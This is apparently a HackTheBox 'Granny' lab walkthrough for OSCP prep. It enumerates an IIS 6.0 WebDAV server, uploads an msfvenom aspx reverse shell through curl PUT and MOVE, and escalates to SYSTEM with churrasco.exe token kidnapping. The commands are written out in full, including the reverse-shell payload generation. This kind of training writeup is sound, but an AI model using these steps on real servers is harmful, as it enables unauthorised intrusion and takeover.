---
title: HackTheBox - Granny
date: 2021-08-14 02:40:02 +0100
categories: [Hackthebox walkthroughs, Windows, Easy]
tags: [Microsoft IIS, WebDav, gobuster, PUT, curl, aspx, msfvenom, reverse-shell, Windows-Exploit-Suggester, Impacket, smbserver.py, churrasco.exe, SeImpersonatePrivilege, htb-windows-easy, writeup, oscp-prep]
image: /assets/img/htb/machines/windows/easy/granny/Granny.png
---

## Enumeration

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Granny-full-port-scan.txt 10.10.10.15 
Nmap scan report for 10.10.10.15
Host is up (0.12s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Fri, 13 Aug 2021 22:54:23 GMT
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Port 80 (Microsoft IIS httpd 6.0)

#### `gobuster`

```bash
$ gobuster dir -u http://10.10.10.15 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt -o services/80-http.txt
===============================================================
/Images               (Status: 301) [Size: 149] [--> http://10.10.10.15/Images/]
/_private             (Status: 301) [Size: 153] [--> http://10.10.10.15/%5Fprivate/]
/_vti_bin             (Status: 301) [Size: 155] [--> http://10.10.10.15/%5Fvti%5Fbin/]
/_vti_bin/_vti_adm/admin.dll (Status: 200) [Size: 195]                                
/_vti_bin/_vti_aut/author.dll (Status: 200) [Size: 195]                               
/_vti_bin/shtml.dll   (Status: 200) [Size: 96]                                        
/_vti_log             (Status: 301) [Size: 155] [--> http://10.10.10.15/%5Fvti%5Flog/]
/aspnet_client        (Status: 301) [Size: 158] [--> http://10.10.10.15/aspnet%5Fclient/]
/images               (Status: 301) [Size: 149] [--> http://10.10.10.15/images/]         
                                                                                         
===============================================================
```

### WebDav

As for [Grandpa](https://amirr0r.github.io/posts/htb-grandpa/), we identified that the target is using the **WebDav** protocol and the **HTTP PUT** method is allowed. This could potentially give us the ability to upload files.

We can verify that using the `davtest` tool:

```bash
$ davtest --url http://$TARGET
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: tWrff7dBAGc3LT
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT
********************************************************
 Sending test files
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.html
PUT     cgi     FAIL
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.jsp
PUT     shtml   FAIL
PUT     aspx    FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.pl
PUT     asp     FAIL
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.php
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.jhtml
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.txt
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.cfm
********************************************************
 Checking for test file execution
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.html
EXEC    jsp     FAIL
EXEC    pl      FAIL
EXEC    php     FAIL
EXEC    jhtml   FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.txt
EXEC    cfm     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT
PUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.html
PUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.jsp
PUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.pl
PUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.php
PUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.jhtml
PUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.txt
PUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.cfm
Executes: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.html
Executes: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.txt
```

This time we can upload arbitrary files to the web server.

![](/assets/img/htb/machines/windows/easy/granny/PUT_mimiron.png)

___

## Exploitation

`gobuster` revealed a folder called `/aspnet_client`

Let's try to upload an **aspx reverse shell**:

```bash
$ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=$(vpnip) LPORT=1234 -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2695 bytes
Saved as: shell.aspx
$ mv shell.aspx shell.txt
$ curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt
$ curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt'
```

Run a listener using `netcat`, `curl` the uploaded file and we have a shell:

![](/assets/img/htb/machines/windows/easy/granny/shell.png)

## Privesc (without Metasploit)

### `systeminfo`

```
C:\WINDOWS\Temp>systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 42 Minutes, 21 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 778 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,317 MB
Page File: In Use:         153 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

Now we can use [Windows-Exploit-Suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester):

```bash
$ wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
$ pip2.7 install xlrd==1.2.0
$ python windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2021-08-14-mssb.xls
[*] done
$ root@kali:~/htb/machines/Windows/Granny# python windows-exploit-suggester.py --database 2021-08-14-mssb.xls --systeminfo systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
[*] there are now 356 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2003 SP2 32-bit'
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
[*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
[*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*] 
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*] 
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
[*] done
```

The output shows either public **exploits (E)**, or **Metasploit modules (M)** as indicated by the character value.

> I tried many of those, but I think the shell was too unstable to run the exploits correctly.

Then, I looked at the privileges of the user:

![](/assets/img/htb/machines/windows/easy/granny/priv.png)

So I decided to look at [Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation ](https://www.exploit-db.com/exploits/6705).

I ran an SMB server on my Kali machine in order to transfer the exploit file `churrasco.exe` to the target:

```bash
$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
...
```

I executed `churrasco.exe` then I got **SYSTEM**:  

![](/assets/img/htb/machines/windows/easy/granny/churrasco.png)

![](/assets/img/htb/machines/windows/easy/granny/flags.png)

___

## Useful links

- [Windows-Exploit-Suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation ](https://www.exploit-db.com/exploits/6705)
- [churrasco.exe](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe)
- [OSCP Prep v6: 3 Easy OSCP-Similar HTB Machines in Less Than 20 minutes (Manual Exploitation)](https://www.youtube.com/watch?v=Ut6c9SU5Wps)